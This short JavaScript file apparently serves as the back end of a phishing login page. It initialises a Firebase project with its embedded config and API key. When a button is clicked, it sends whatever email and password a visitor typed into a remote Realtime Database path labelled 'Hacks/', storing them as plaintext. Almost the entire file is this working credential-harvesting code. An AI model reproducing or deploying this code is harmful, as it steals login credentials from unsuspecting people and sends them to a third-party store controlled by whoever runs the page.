//you code right here

///firebase on bottom

// Import the functions you need from the SDKs you need
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.10/firebase-app.js";
import { getAnalytics } from "https://www.gstatic.com/firebasejs/9.6.10/firebase-analytics.js";
import {
  getDatabase,
  set,
  ref,
  push,
} from "https://www.gstatic.com/firebasejs/9.6.10/firebase-database.js";
// TODO: Add SDKs for Firebase products that you want to use
// https://firebase.google.com/docs/web/setup#available-libraries

// Your web app's Firebase configuration
// For Firebase JS SDK v7.20.0 and later, measurementId is optional
const firebaseConfig = {
  apiKey: "AIzaSyDKS6W1jg7qxyXz-kZL4vd_QITCk0CXCH4",
  authDomain: "fir-database-b9bfa.firebaseapp.com",
  databaseURL: "https://fir-database-b9bfa-default-rtdb.firebaseio.com",
  projectId: "fir-database-b9bfa",
  storageBucket: "fir-database-b9bfa.appspot.com",
  messagingSenderId: "675591142419",
  appId: "1:675591142419:web:b8a9116b9ae023a42593e6",
  measurementId: "G-4GT4WLR2GM",
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const analytics = getAnalytics(app);

//////   firebase on top
var btn = document.getElementById("btn");
var pas = document.getElementById("pas");
var emel = document.getElementById("emel");

btn.addEventListener("click", function () {
  if (emel.value == "" || pas.value == "") {
    null;
  } else {
    var db = getDatabase();
    var dbRef = ref(db, 'Hacks/');
    var dbPush = push(dbRef);
    set(dbPush, {
      Email: emel.value,
      Password: pas.value,
    });
  }
});
